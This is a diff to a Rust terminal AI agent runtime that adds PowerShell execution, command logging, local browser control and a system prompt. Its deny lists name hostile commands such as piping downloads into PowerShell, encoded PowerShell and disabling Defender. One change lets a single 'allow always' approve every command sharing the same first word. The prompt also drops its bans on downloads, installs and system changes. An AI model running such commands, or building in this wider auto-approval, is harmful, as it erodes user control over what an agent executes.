@@ -3,7 +3,10 @@
 // Sandboxed terminal AI runtime with a ratatui/crossterm TUI, streaming chat, tool execution, and permission-gated command execution.
 
 use crossterm::{
-    event::{self, Event as CEvent, KeyCode, KeyEvent, KeyEventKind, KeyModifiers},
+    event::{
+        self, DisableMouseCapture, EnableMouseCapture, Event as CEvent, KeyCode, KeyEvent,
+        KeyEventKind, KeyModifiers, MouseEvent, MouseEventKind,
+    },
     execute,
     terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
 };
@@ -31,7 +34,7 @@ use std::io::{self, Stdout};
 use std::path::{Component, Path, PathBuf};
 use std::process::{Command, Stdio};
 use std::thread;
-use std::time::{Duration, Instant};
+use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 use tokio::sync::{mpsc, oneshot};
 
 const MAX_AGENT_STEPS: usize = 5;
@@ -39,6 +42,7 @@ const DEFAULT_SANDBOX_DIR: &str = "sandbox/workspace";
 const DEFAULT_SANDBOX_COMMAND_TIMEOUT_MS: u64 = 30_000;
 const DEFAULT_MAX_TOKENS: u64 = 1024;
 const TOOL_RESULT_PREFIX: &str = "Tool result from TRUST runtime: ";
+const WEBBRIDGE_COMMAND_URL: &str = "http://127.0.0.1:10086/command";
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
 struct Message {
@@ -60,6 +64,11 @@ struct ToolArgs {
     url: Option<String>,
     app: Option<String>,
     command: Option<String>,
+    action: Option<String>,
+    selector: Option<String>,
+    value: Option<String>,
+    session: Option<String>,
+    new_tab: Option<bool>,
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -126,6 +135,38 @@ enum CommandRisk {
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum CommandShell {
+    PowerShell,
+}
+
+impl CommandShell {
+    fn label(self) -> &'static str {
+        match self {
+            CommandShell::PowerShell => "PowerShell",
+        }
+    }
+
+    fn program(self) -> &'static str {
+        match self {
+            CommandShell::PowerShell if cfg!(windows) => "powershell.exe",
+            CommandShell::PowerShell => "pwsh",
+        }
+    }
+
+    fn args(self, command: &str) -> Vec<String> {
+        match self {
+            CommandShell::PowerShell => vec![
+                "-NoProfile".to_string(),
+                "-ExecutionPolicy".to_string(),
+                "Bypass".to_string(),
+                "-Command".to_string(),
+                command.to_string(),
+            ],
+        }
+    }
+}
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
 enum PermissionChoice {
     AllowOnce,
     AllowAlways,
@@ -152,6 +193,16 @@ struct PendingApproval {
     risk_label: String,
     allow_always: bool,
     responder: oneshot::Sender<PermissionChoice>,
+}
+
+#[derive(Serialize)]
+struct CommandLogEntry {
+    timestamp_unix_ms: u128,
+    shell: String,
+    command: String,
+    permission_choice: String,
+    result: String,
+    blocked: bool,
 }
 
 enum RuntimeEvent {
@@ -559,6 +610,51 @@ fn normalize_command(command: &str) -> String {
     command.trim().to_string()
 }
 
+fn command_log_path() -> PathBuf {
+    permissions_dir().join("command_log.jsonl")
+}
+
+fn current_timestamp_unix_ms() -> u128 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|duration| duration.as_millis())
+        .unwrap_or_default()
+}
+
+fn append_command_log(
+    shell: CommandShell,
+    command: &str,
+    permission_choice: &str,
+    result: &str,
+    blocked: bool,
+) {
+    let dir = permissions_dir();
+    if fs::create_dir_all(&dir).is_err() {
+        return;
+    }
+
+    let entry = CommandLogEntry {
+        timestamp_unix_ms: current_timestamp_unix_ms(),
+        shell: shell.label().to_string(),
+        command: command.to_string(),
+        permission_choice: permission_choice.to_string(),
+        result: result.to_string(),
+        blocked,
+    };
+
+    let Ok(mut line) = serde_json::to_string(&entry) else {
+        return;
+    };
+    line.push('\n');
+
+    let path = command_log_path();
+    let _ = fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(path)
+        .and_then(|mut file| std::io::Write::write_all(&mut file, line.as_bytes()));
+}
+
 fn allow_destructive_actions() -> bool {
     env::var("ALLOW_DESTRUCTIVE_ACTIONS")
         .ok()
@@ -571,73 +667,144 @@ fn allow_destructive_actions() -> bool {
         .unwrap_or(false)
 }
 
-fn command_targets_protected_path(normalized_command: &str, project_root: &Path) -> bool {
-    let sensitive_targets = [
-        "windows",
-        "system32",
-        "c:/users",
-        "c:\\users",
-        "%userprofile%",
-        "$env:userprofile",
-        ".env",
-        ".git",
-        "memory",
-        "sandbox",
-    ];
+fn command_contains_any(normalized_command: &str, patterns: &[&str]) -> bool {
+    patterns
+        .iter()
+        .any(|pattern| normalized_command.contains(pattern))
+}
 
+fn command_uses_destructive_verb(normalized_command: &str) -> bool {
+    command_contains_any(
+        normalized_command,
+        &[
+            "remove-item",
+            " rm ",
+            "rm -",
+            "del ",
+            "erase ",
+            "rmdir",
+            "rd /",
+            "clear-disk",
+            "format",
+            "diskpart",
+            "bcdedit",
+            "reg delete",
+            "reg add",
+            "set-mppreference",
+            "disable-",
+            "stop-service",
+            "sc delete",
+            "takeown",
+            "icacls",
+        ],
+    )
+}
+
+fn command_targets_protected_path(normalized_command: &str, project_root: &Path) -> bool {
     let project_root_text = project_root
         .to_string_lossy()
         .replace('\\', "/")
         .to_lowercase();
 
-    sensitive_targets
-        .iter()
-        .any(|target| normalized_command.contains(target))
-        || normalized_command.contains(&project_root_text)
-        || normalized_command.contains("/trust")
-        || normalized_command.contains("\\trust")
+    command_contains_any(
+        normalized_command,
+        &[
+            "c:\\windows",
+            "c:/windows",
+            "\\windows\\system32",
+            "/windows/system32",
+            "system32",
+            "boot.ini",
+            "bootmgr",
+            "bcd",
+            "ntldr",
+            "sam",
+            "security",
+            "software",
+            "system32\\config",
+            "system32/config",
+            "hkey_local_machine",
+            "hklm",
+            "hkey_classes_root",
+            "hkcr",
+            "%userprofile%",
+            "$env:userprofile",
+            "c:\\users\\",
+            "c:/users/",
+        ],
+    ) || (!project_root_text.is_empty() && normalized_command.contains(&project_root_text))
+}
+
+fn command_targets_entire_drive(normalized_command: &str) -> bool {
+    command_contains_any(
+        normalized_command,
+        &[
+            " c:\\ -recurse",
+            " c:/ -recurse",
+            " c:\\* -recurse",
+            " c:/* -recurse",
+            " c:\\ -force",
+            " c:/ -force",
+            " c:\\* -force",
+            " c:/* -force",
+            " / ",
+        ],
+    )
 }
 
 fn destructive_command_reason(command: &str, project_root: &Path) -> Option<String> {
-    let normalized = command.trim().to_lowercase();
+    let normalized = format!(" {} ", command.trim().to_lowercase());
 
-    let destructive_patterns = [
-        "shutdown",
-        "restart",
-        "logoff",
-        "taskkill",
-        "format",
-        "diskpart",
-        "bcdedit",
-        "reg delete",
-        "reg add",
-        "takeown",
-        "icacls",
-        "del /s",
-        "rmdir /s",
-        "rd /s",
-        "rm -rf",
-        "remove-item -recurse",
-        "powershell -enc",
-    ];
-
-    if let Some(pattern) = destructive_patterns
-        .iter()
-        .find(|pattern| normalized.contains(**pattern))
-    {
-        return Some(format!("matched destructive pattern: {}", pattern));
+    if normalized.contains("powershell -enc") || normalized.contains("powershell.exe -enc") {
+        return Some("encoded PowerShell can hide destructive actions".to_string());
     }
 
     if normalized.contains("curl") && normalized.contains("| powershell") {
-        return Some("matched destructive pattern: curl ... | powershell".to_string());
+        return Some("downloaded script is piped directly into PowerShell".to_string());
     }
 
     if normalized.contains("irm") && normalized.contains("| iex") {
-        return Some("matched destructive pattern: irm ... | iex".to_string());
+        return Some("downloaded script is executed with Invoke-Expression".to_string());
     }
 
-    if command_targets_protected_path(&normalized, project_root) {
-        return Some("targets a protected system or project path".to_string());
+    if command_contains_any(
+        &normalized,
+        &[
+            "format ",
+            "format-volume",
+            "clear-disk",
+            "initialize-disk",
+            "remove-partition",
+            "diskpart",
+            "bcdedit",
+        ],
+    ) {
+        return Some("may wipe drives or modify boot configuration".to_string());
+    }
+
+    if command_contains_any(
+        &normalized,
+        &[
+            "disable-windowsdefender",
+            "disable-realtimemonitoring",
+            "set-mppreference -disablerealtimemonitoring $true",
+            "stop-service windefend",
+            "sc stop windefend",
+        ],
+    ) {
+        return Some("may disable security tools".to_string());
+    }
+
+    if command_uses_destructive_verb(&normalized) && command_targets_entire_drive(&normalized) {
+        return Some("targets an entire drive with a destructive operation".to_string());
+    }
+
+    if command_uses_destructive_verb(&normalized)
+        && command_targets_protected_path(&normalized, project_root)
+    {
+        return Some(
+            "may damage system files, boot files, registry hives, or user profile data".to_string(),
+        );
     }
 
     None
@@ -651,6 +818,31 @@ fn blocked_command_reason(command: &str) -> Option<String> {
     }
 }
 
+fn command_approval_signature(command: &str) -> Option<String> {
+    let lower = command.trim().to_lowercase();
+    let first_line = lower.lines().find(|line| !line.trim().is_empty())?.trim();
+    let separators = [' ', '\t', '|', ';', '&', '\r', '\n'];
+    let first_token = first_line
+        .split(separators)
+        .find(|token| !token.trim().is_empty())?
+        .trim_matches(|ch| matches!(ch, '"' | '\'' | '(' | ')'));
+
+    if first_token.is_empty() || first_token.starts_with('$') {
+        return None;
+    }
+
+    Some(format!("signature:powershell:{}", first_token))
+}
+
+fn command_is_preapproved(command: &str, allowed_commands: &BTreeSet<String>) -> bool {
+    let normalized = normalize_command(command);
+
+    allowed_commands.contains(&normalized)
+        || command_approval_signature(command)
+            .as_ref()
+            .is_some_and(|signature| allowed_commands.contains(signature))
+}
+
 fn classify_command_risk(command: &str, project_root: &Path) -> Result<CommandRisk, String> {
     if blocked_command_reason(command).is_some() {
         return Ok(CommandRisk::Blocked);
@@ -660,10 +852,9 @@ fn classify_command_risk(command: &str, project_root: &Path) -> Result<CommandRi
         return Ok(CommandRisk::Destructive);
     }
 
-    let normalized = normalize_command(command);
     let allowed_commands = load_allowed_commands()?;
 
-    if allowed_commands.contains(&normalized) {
+    if command_is_preapproved(command, &allowed_commands) {
         Ok(CommandRisk::Safe)
     } else {
         Ok(CommandRisk::NeedsApproval)
@@ -678,6 +869,11 @@ fn persist_allowed_command(command: &str, project_root: &Path) -> Result<(), Str
     let normalized = normalize_command(command);
     let mut allowed_commands = load_allowed_commands()?;
     allowed_commands.insert(normalized);
+
+    if let Some(signature) = command_approval_signature(command) {
+        allowed_commands.insert(signature);
+    }
+
     save_allowed_commands(&allowed_commands)
 }
 
@@ -773,6 +969,95 @@ fn execute_command_with_timeout(
     }
 }
 
+fn execute_powershell_with_timeout(sandbox: &SandboxConfig, command: &str) -> String {
+    let shell = CommandShell::PowerShell;
+    let display_name = command.trim();
+    let args = shell.args(command);
+
+    let mut child = match Command::new(shell.program())
+        .args(&args)
+        .current_dir(&sandbox.workspace)
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+    {
+        Ok(child) => child,
+        Err(e) => return format!("Command failed: {}\n[stderr]\n{}", display_name, e),
+    };
+
+    let start = Instant::now();
+
+    loop {
+        match child.try_wait() {
+            Ok(Some(_)) => {
+                return match child.wait_with_output() {
+                    Ok(output) => {
+                        let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
+                        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
+
+                        if output.status.success() {
+                            if stdout.is_empty() {
+                                format!(
+                                    "Executed PowerShell command:\n{}\nStatus: success",
+                                    display_name
+                                )
+                            } else {
+                                format!(
+                                    "Executed PowerShell command:\n{}\nStatus: success\n[stdout]\n{}",
+                                    display_name, stdout
+                                )
+                            }
+                        } else if stdout.is_empty() && stderr.is_empty() {
+                            format!(
+                                "PowerShell command failed:\n{}\nStatus: {}",
+                                display_name, output.status
+                            )
+                        } else if stdout.is_empty() {
+                            format!(
+                                "PowerShell command failed:\n{}\n[stderr]\n{}",
+                                display_name, stderr
+                            )
+                        } else if stderr.is_empty() {
+                            format!(
+                                "PowerShell command failed:\n{}\n[stdout]\n{}",
+                                display_name, stdout
+                            )
+                        } else {
+                            format!(
+                                "PowerShell command failed:\n{}\n[stdout]\n{}\n\n[stderr]\n{}",
+                                display_name, stdout, stderr
+                            )
+                        }
+                    }
+                    Err(e) => format!(
+                        "PowerShell command failed:\n{}\n[stderr]\nFailed to collect output: {}",
+                        display_name, e
+                    ),
+                };
+            }
+            Ok(None) => {
+                if start.elapsed() >= Duration::from_millis(sandbox.command_timeout_ms) {
+                    let _ = child.kill();
+                    let _ = child.wait();
+                    return format!(
+                        "PowerShell command timed out:\n{}\nTimeout: {} ms",
+                        display_name, sandbox.command_timeout_ms
+                    );
+                }
+
+                thread::sleep(Duration::from_millis(100));
+            }
+            Err(e) => {
+                return format!(
+                    "PowerShell command failed:\n{}\n[stderr]\nFailed while waiting on command: {}",
+                    display_name, e
+                );
+            }
+        }
+    }
+}
+
 async fn request_permission(
     event_tx: &mpsc::UnboundedSender<RuntimeEvent>,
     title: &str,
@@ -804,29 +1089,40 @@ async fn run_command(
     command: &str,
     event_tx: &mpsc::UnboundedSender<RuntimeEvent>,
 ) -> String {
+    let shell = CommandShell::PowerShell;
     let normalized = normalize_command(command);
     if normalized.is_empty() {
-        return "Blocked command: empty command".to_string();
+        let result = "Blocked command: empty command".to_string();
+        append_command_log(shell, &normalized, "blocked", &result, true);
+        return result;
     }
 
     let project_root = match env::current_dir() {
         Ok(path) => path,
-        Err(e) => return format!("Blocked command: failed to resolve project root: {}", e),
+        Err(e) => {
+            let result = format!("Blocked command: failed to resolve project root: {}", e);
+            append_command_log(shell, &normalized, "blocked", &result, true);
+            return result;
+        }
     };
 
     match classify_command_risk(&normalized, &project_root) {
         Ok(CommandRisk::Blocked) => {
             let reason = blocked_command_reason(&normalized)
                 .unwrap_or_else(|| "blocked by runtime policy".to_string());
-            format!("Blocked command: {} ({})", normalized, reason)
+            let result = format!("Blocked command: {} ({})", normalized, reason);
+            append_command_log(shell, &normalized, "blocked", &result, true);
+            result
         }
         Ok(CommandRisk::Safe) => {
-            execute_command_with_timeout(sandbox, "cmd", &["/C", normalized.as_str()], &normalized)
+            let result = execute_powershell_with_timeout(sandbox, &normalized);
+            append_command_log(shell, &normalized, "preapproved", &result, false);
+            result
         }
         Ok(CommandRisk::NeedsApproval) => {
             let choice = request_permission(
                 event_tx,
-                "Command requested",
+                "PowerShell command requested",
                 &normalized,
                 "NeedsApproval",
                 true,
@@ -834,26 +1130,27 @@ async fn run_command(
             .await;
 
             match choice {
-                PermissionChoice::AllowOnce => execute_command_with_timeout(
-                    sandbox,
-                    "cmd",
-                    &["/C", normalized.as_str()],
-                    &normalized,
-                ),
+                PermissionChoice::AllowOnce => {
+                    let result = execute_powershell_with_timeout(sandbox, &normalized);
+                    append_command_log(shell, &normalized, "allow_once", &result, false);
+                    result
+                }
                 PermissionChoice::AllowAlways => {
-                    match persist_allowed_command(&normalized, &project_root) {
-                        Ok(()) => execute_command_with_timeout(
-                            sandbox,
-                            "cmd",
-                            &["/C", normalized.as_str()],
-                            &normalized,
-                        ),
+                    let result = match persist_allowed_command(&normalized, &project_root) {
+                        Ok(()) => execute_powershell_with_timeout(sandbox, &normalized),
                         Err(error) => {
                             format!("Blocked command: failed to persist approval ({})", error)
                         }
-                    }
+                    };
+                    let blocked = result.starts_with("Blocked command:");
+                    append_command_log(shell, &normalized, "allow_always", &result, blocked);
+                    result
                 }
-                PermissionChoice::Decline => format!("User declined command: {}", normalized),
+                PermissionChoice::Decline => {
+                    let result = format!("User declined command: {}", normalized);
+                    append_command_log(shell, &normalized, "decline", &result, true);
+                    result
+                }
             }
         }
         Ok(CommandRisk::Destructive) => {
@@ -861,12 +1158,17 @@ async fn run_command(
                 .unwrap_or_else(|| "matched destructive runtime policy".to_string());
 
             if !allow_destructive_actions() {
-                return format!("Blocked destructive command: {} ({})", normalized, reason);
+                let result = format!(
+                    "This command was blocked because it may damage system files.\nReason: {}\nSafer alternative: narrow the command to a non-system path, preview affected items with Get-ChildItem, or ask for a read-only diagnostic command first.\nCommand:\n{}",
+                    reason, normalized
+                );
+                append_command_log(shell, &normalized, "blocked", &result, true);
+                return result;
             }
 
             let choice = request_permission(
                 event_tx,
-                "Destructive command requested",
+                "Destructive PowerShell command requested",
                 &normalized,
                 "Destructive",
                 false,
@@ -874,21 +1176,32 @@ async fn run_command(
             .await;
 
             match choice {
-                PermissionChoice::AllowOnce => execute_command_with_timeout(
-                    sandbox,
-                    "cmd",
-                    &["/C", normalized.as_str()],
-                    &normalized,
-                ),
+                PermissionChoice::AllowOnce => {
+                    let result = execute_powershell_with_timeout(sandbox, &normalized);
+                    append_command_log(
+                        shell,
+                        &normalized,
+                        "allow_once_destructive",
+                        &result,
+                        false,
+                    );
+                    result
+                }
                 PermissionChoice::AllowAlways | PermissionChoice::Decline => {
-                    format!("User declined command: {}", normalized)
+                    let result = format!("User declined command: {}", normalized);
+                    append_command_log(shell, &normalized, "decline_destructive", &result, true);
+                    result
                 }
             }
         }
-        Err(error) => format!(
-            "Blocked command: failed to classify command risk ({})",
-            error
-        ),
+        Err(error) => {
+            let result = format!(
+                "Blocked command: failed to classify command risk ({})",
+                error
+            );
+            append_command_log(shell, &normalized, "blocked", &result, true);
+            result
+        }
     }
 }
 
@@ -1126,11 +1439,7 @@ fn allowed_sandbox_command(command: &str) -> Option<AllowedCommand> {
             program: "cargo",
             args: &["check"],
         }),
-        "cargo test" => Some(AllowedCommand {
-            display: "cargo test",
-            program: "cargo",
-            args: &["test"],
-        }),
+
         "cargo fmt --check" => Some(AllowedCommand {
             display: "cargo fmt --check",
             program: "cargo",
@@ -1152,7 +1461,7 @@ async fn run_sandboxed_command(
 ) -> String {
     let Some(allowed_command) = allowed_sandbox_command(command) else {
         return format!(
-            "Blocked command: {}. Allowed sandbox commands: cargo check, cargo test, cargo fmt --check, cargo clippy",
+            "Blocked command: {}. Allowed sandbox commands: cargo check, cargo fmt --check, cargo clippy",
             command
         );
     };
@@ -1179,47 +1488,109 @@ async fn run_sandboxed_command(
     }
 }
 
-fn open_app(app: &str, url: Option<String>) -> String {
-    let normalized_app = app.trim().to_lowercase();
+fn webbridge_unavailable_message(error: &str) -> String {
+    format!(
+        "Kimi WebBridge is not available or not connected. Install the Kimi WebBridge browser extension, install/start the device daemon, then retry. Check it with `~/.kimi-webbridge/bin/kimi-webbridge status`. Details: {}",
+        error
+    )
+}
 
-    let executable = match normalized_app.as_str() {
-        "chrome" | "google chrome" => "chrome",
-        "edge" | "microsoft edge" => "msedge",
-        "firefox" => "firefox",
-        "notepad" => "notepad",
-        "calculator" | "calc" => "calc",
-        "explorer" | "file explorer" => "explorer",
-        "paint" | "mspaint" => "mspaint",
-        "wordpad" => "write",
-        "vscode" | "vs code" | "code" => "code",
-        _ => {
-            return format!(
-                "Blocked app: {}. Allowed apps: chrome, edge, firefox, notepad, calculator, explorer, paint, wordpad, vscode",
-                app
-            );
-        }
+async fn send_webbridge_command(
+    action: &str,
+    args: serde_json::Value,
+    session: Option<String>,
+) -> String {
+    let client = Client::new();
+    let mut body = json!({
+        "action": action,
+        "args": args,
+    });
+
+    if let Some(session) = session.filter(|session| !session.trim().is_empty()) {
+        body["session"] = json!(session);
+    }
+
+    let response = client.post(WEBBRIDGE_COMMAND_URL).json(&body).send().await;
+
+    let response = match response {
+        Ok(response) => response,
+        Err(error) => return webbridge_unavailable_message(&error.to_string()),
     };
 
-    if let Some(url) = url {
-        if !url.starts_with("https://") && !url.starts_with("http://") {
-            return "Blocked unsafe URL. Only http:// and https:// URLs are allowed.".to_string();
-        }
+    let status = response.status();
+    let text = response
+        .text()
+        .await
+        .unwrap_or_else(|_| "<failed to read WebBridge response>".to_string());
 
-        match Command::new("cmd")
-            .args(["/C", "start", "", executable, &url])
-            .spawn()
-        {
-            Ok(_) => format!("Opened {} with URL: {}", app, url),
-            Err(e) => format!("Failed to open {}: {}", app, e),
+    if !status.is_success() {
+        return webbridge_unavailable_message(&format!("HTTP {}: {}", status, text));
+    }
+
+    format!("Kimi WebBridge {} result:\n{}", action, text)
+}
+
+async fn run_webbridge_tool(tool_call: ToolCall) -> String {
+    let session = tool_call.args.session.or_else(|| Some("trust".to_string()));
+    let action = tool_call
+        .args
+        .action
+        .unwrap_or_else(|| "navigate".to_string())
+        .trim()
+        .to_lowercase();
+
+    match action.as_str() {
+        "navigate" | "open" => {
+            let Some(url) = tool_call.args.url else {
+                return "Missing url for Kimi WebBridge navigate".to_string();
+            };
+            send_webbridge_command(
+                "navigate",
+                json!({
+                    "url": url,
+                    "newTab": tool_call.args.new_tab.unwrap_or(true),
+                    "group_title": "TRUST"
+                }),
+                session,
+            )
+            .await
         }
-    } else {
-        match Command::new("cmd")
-            .args(["/C", "start", "", executable])
-            .spawn()
-        {
-            Ok(_) => format!("Opened {}", app),
-            Err(e) => format!("Failed to open {}: {}", app, e),
+        "snapshot" | "read" => send_webbridge_command("snapshot", json!({}), session).await,
+        "click" => {
+            let Some(selector) = tool_call.args.selector else {
+                return "Missing selector for Kimi WebBridge click".to_string();
+            };
+            send_webbridge_command("click", json!({ "selector": selector }), session).await
         }
+        "fill" | "type" => {
+            let Some(selector) = tool_call.args.selector else {
+                return "Missing selector for Kimi WebBridge fill".to_string();
+            };
+            let Some(value) = tool_call.args.value.or(tool_call.args.content) else {
+                return "Missing value for Kimi WebBridge fill".to_string();
+            };
+            send_webbridge_command(
+                "fill",
+                json!({
+                    "selector": selector,
+                    "value": value
+                }),
+                session,
+            )
+            .await
+        }
+        "evaluate" => {
+            let Some(code) = tool_call.args.content else {
+                return "Missing content code for Kimi WebBridge evaluate".to_string();
+            };
+            send_webbridge_command("evaluate", json!({ "code": code }), session).await
+        }
+        "tabs" | "list_tabs" => send_webbridge_command("list_tabs", json!({}), session).await,
+        "close_tab" => send_webbridge_command("close_tab", json!({}), session).await,
+        other => format!(
+            "Unknown Kimi WebBridge action: {}. Supported actions: navigate, snapshot, click, fill, evaluate, list_tabs, close_tab",
+            other
+        ),
     }
 }
 
@@ -1320,14 +1691,7 @@ async fn run_tool(
 
             list_runtime_directory(sandbox, &path)
         }
-        "open_chrome" => open_app("chrome", tool_call.args.url),
-        "open_app" => {
-            let Some(app) = tool_call.args.app else {
-                return "Missing app for open_app".to_string();
-            };
-
-            open_app(&app, tool_call.args.url)
-        }
+        "kimi_webbridge" | "web_bridge" | "browser_control" => run_webbridge_tool(tool_call).await,
         "run_sandboxed_command" => {
             let Some(command) = tool_call.args.command else {
                 return "Missing command for run_sandboxed_command".to_string();
@@ -1421,7 +1785,8 @@ fn system_prompt() -> String {
 You are TRUST.
 
 You are a helpful terminal AI with safe agentic control.
-Use tools only when the user clearly asks for an action on the computer, files, apps, or sandbox.
+You are the planner: decide which tool or command should be used for each user request.
+Use tools only when the user clearly asks for an action on the computer, files, apps, browser, web pages, or sandbox.
 For normal conversation, answer normally and do not call tools.
 You may use multiple tools across multiple steps in a single turn.
 When using a tool, reply ONLY with JSON and no extra text.
@@ -1437,7 +1802,7 @@ Example write_file tool call:
   "type": "tool_call",
   "tool": "write_file",
   "args": {
-    "path": "outputs/test.md",
+    "path": "outputs/example.md",
     "content": "Hello world"
   }
 }
@@ -1447,7 +1812,59 @@ Example run_command tool call:
   "type": "tool_call",
   "tool": "run_command",
   "args": {
-    "command": "cargo check"
+    "command": "Get-ChildItem"
+  }
+}
+
+Example delayed PowerShell action:
+{
+  "type": "tool_call",
+  "tool": "run_command",
+  "args": {
+    "command": "$processes = @()\nfor ($i = 0; $i -lt 5; $i++) {\n    $processes += Start-Process cmd -PassThru\n    Start-Sleep -Seconds 1\n}\nStart-Sleep -Seconds 5\nforeach ($p in $processes) {\n    if (!$p.HasExited) {\n        Stop-Process -Id $p.Id -Force\n    }\n}"
+  }
+}
+
+Example Kimi WebBridge navigate tool call:
+{
+  "type": "tool_call",
+  "tool": "kimi_webbridge",
+  "args": {
+    "action": "navigate",
+    "url": "https://www.youtube.com",
+    "new_tab": true,
+    "session": "trust"
+  }
+}
+
+Example Kimi WebBridge page read tool call:
+{
+  "type": "tool_call",
+  "tool": "kimi_webbridge",
+  "args": {
+    "action": "snapshot",
+    "session": "trust"
+  }
+}
+
+Example Kimi WebBridge click/fill tool calls:
+{
+  "type": "tool_call",
+  "tool": "kimi_webbridge",
+  "args": {
+    "action": "click",
+    "selector": "@e1",
+    "session": "trust"
+  }
+}
+{
+  "type": "tool_call",
+  "tool": "kimi_webbridge",
+  "args": {
+    "action": "fill",
+    "selector": "@e2",
+    "value": "search text",
+    "session": "trust"
   }
 }
 
@@ -1455,17 +1872,24 @@ Allowed tools:
 - write_file: reads and writes only inside sandboxed workspace/, outputs/, or temp/
 - read_file: only reads inside sandboxed workspace/, outputs/, or temp/
 - list_directory: only lists inside sandboxed workspace/, outputs/, or temp/
-- open_app: opens allowed apps only. Allowed apps: chrome, edge, firefox, notepad, calculator, explorer, paint, wordpad, vscode
-- open_chrome: alias for opening Chrome
-- run_sandboxed_command: runs allowlisted project commands only inside sandbox/workspace after user approval. Allowed commands: cargo check, cargo test, cargo fmt --check, cargo clippy
-- run_command: may request broader shell commands inside sandbox/workspace. The runtime decides whether to execute the command, whether approval is required, and whether the command is blocked.
+- kimi_webbridge: full browser control through Kimi WebBridge. Actions: navigate, snapshot, click, fill, evaluate, list_tabs, close_tab. If WebBridge is not installed or connected, the runtime asks the user to install/start it first.
+- run_sandboxed_command: runs allowlisted project commands only inside sandbox/workspace after user approval. Allowed commands: cargo check, cargo fmt --check, cargo clippy
+- run_command: runs PowerShell by default on Windows from sandbox/workspace. Use it for normal PowerShell commands, opening apps, creating files/folders, reading files, running scripts, process management, networking/debug commands, delayed/sequenced actions, and launching multiple terminals/apps. The runtime decides whether approval is required and whether the command is blocked.
+
+Command planning rules:
+- Understand the user's intent, generate PowerShell, rely on the runtime's destructive-command detector, request execution through run_command, then explain the result.
+- For delayed or scheduled tasks, generate a complete PowerShell script with variables, loops, Start-Sleep, process tracking with -PassThru where possible, and cleanup after completion.
+- For multi-step app/process tasks, prefer tracking process objects instead of broad process kills. Use Stop-Process only for processes you started when possible.
+- If permission is required, the runtime will show the generated command/script before execution.
 
 Safety rules:
-- Do not claim you cannot interact with the computer when an allowed tool can do the task.
-- Do not read or write outside the sandbox, modify system settings, install software, download files, or access private data such as .env files.
+- Do not claim you cannot interact with the computer or browser when an allowed tool can do the task.
+- If the user asks to open a website, browser, Chrome, YouTube, or a URL, decide whether to use kimi_webbridge or run_command. Do not wait for the runtime to infer the action.
+- If the user asks to read, click, type, search inside, inspect, configure, buy, check out, or interact with a webpage, use kimi_webbridge. If the tool result says Kimi WebBridge is not available, tell the user to install the browser extension and start the device daemon first.
+- Do not access private data such as .env files unless the user explicitly asks and the runtime allows it.
 - You may request run_command when needed, but the runtime decides whether it executes.
-- Destructive commands may be blocked unless ALLOW_DESTRUCTIVE_ACTIONS=true and the user explicitly approves them.
-- If the runtime blocks a command, explain that the runtime blocked it.
+- Destructive commands targeting system folders, Windows/System32, boot files, registry hives, entire drives, security tools, or user profiles may be blocked unless ALLOW_DESTRUCTIVE_ACTIONS=true and the user explicitly approves them.
+- If the runtime blocks a command, briefly explain that the runtime blocked it and suggest a safer alternative.
 - Never claim a command ran unless the runtime returns a tool result confirming it ran.
 - Never pretend to save files, read files, list directories, open apps, or run commands. Use a tool when available.
 - If a tool is useful, prefer actually using it over just describing what would happen.
@@ -1475,16 +1899,20 @@ Safety rules:
 }
 
 fn ensure_system_message(mut history: Vec<Message>) -> Vec<Message> {
-    let has_system = history.iter().any(|message| message.role == "system");
-    if !has_system {
+    let prompt = system_prompt();
+
+    if let Some(system_message) = history.iter_mut().find(|message| message.role == "system") {
+        system_message.content = prompt;
+    } else {
         history.insert(
             0,
             Message {
                 role: "system".to_string(),
-                content: system_prompt(),
+                content: prompt,
             },
         );
     }
+
     history
 }
 
@@ -1621,13 +2049,51 @@ fn build_transcript(app: &App) -> Text<'static> {
     Text::from(lines)
 }
 
-fn transcript_line_count(app: &App) -> usize {
-    app.visible_messages.len().saturating_mul(2)
-        + usize::from(!app.draft_assistant.trim().is_empty())
+fn wrapped_line_count(content: &str, viewport_width: u16) -> usize {
+    let width = usize::from(viewport_width.max(1));
+
+    content
+        .lines()
+        .map(|line| {
+            let chars = line.chars().count();
+            chars.saturating_sub(1) / width + 1
+        })
+        .sum::<usize>()
+        .max(1)
 }
 
-fn resolved_transcript_scroll(app: &App, viewport_height: u16) -> u16 {
-    let content_lines = transcript_line_count(app) as u16;
+fn transcript_line_count(app: &App, viewport_width: u16) -> usize {
+    let message_lines = app
+        .visible_messages
+        .iter()
+        .map(|message| {
+            let label_width = match message.role {
+                UiMessageRole::User => 5,
+                UiMessageRole::Assistant => 7,
+                UiMessageRole::Tool => 6,
+                UiMessageRole::Info => 6,
+            };
+            let effective_width = viewport_width.saturating_sub(label_width).max(1);
+
+            wrapped_line_count(&message.content, effective_width) + 1
+        })
+        .sum::<usize>();
+
+    let draft_lines = if app.draft_assistant.trim().is_empty() {
+        0
+    } else {
+        wrapped_line_count(
+            &app.draft_assistant,
+            viewport_width.saturating_sub(7).max(1),
+        )
+    };
+
+    message_lines + draft_lines
+}
+
+fn resolved_transcript_scroll(app: &App, viewport_height: u16, viewport_width: u16) -> u16 {
+    let content_lines =
+        transcript_line_count(app, viewport_width).min(usize::from(u16::MAX)) as u16;
     let max_scroll = content_lines.saturating_sub(viewport_height);
 
     if app.auto_scroll || app.transcript_scroll == u16::MAX {
@@ -1679,9 +2145,11 @@ fn draw_ui(frame: &mut ratatui::Frame<'_>, app: &App) {
 
     let transcript_area = vertical[0];
     let transcript_inner_height = transcript_area.height.saturating_sub(2);
-    let transcript_scroll = resolved_transcript_scroll(app, transcript_inner_height);
+    let transcript_inner_width = transcript_area.width.saturating_sub(2);
+    let transcript_scroll =
+        resolved_transcript_scroll(app, transcript_inner_height, transcript_inner_width);
     let transcript_title = format!(
